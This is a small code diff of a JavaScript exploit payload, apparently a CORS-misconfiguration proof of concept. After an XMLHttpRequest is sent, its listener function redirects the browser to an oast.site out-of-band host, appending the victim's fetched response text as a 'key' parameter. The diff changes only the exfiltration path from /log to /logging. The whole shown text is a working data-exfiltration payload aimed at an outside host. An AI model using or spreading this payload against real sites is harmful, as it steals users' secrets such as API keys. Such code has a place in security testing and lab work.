@@ -10,6 +10,6 @@ req.send();
 
 function reqListener() {
   location =
-    "//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/log?key=" +
+    "//htwayb25ut8nx5cah3pk7i3th126uwm8u.oast.site/logging?key=" +
     this.responseText;
 }
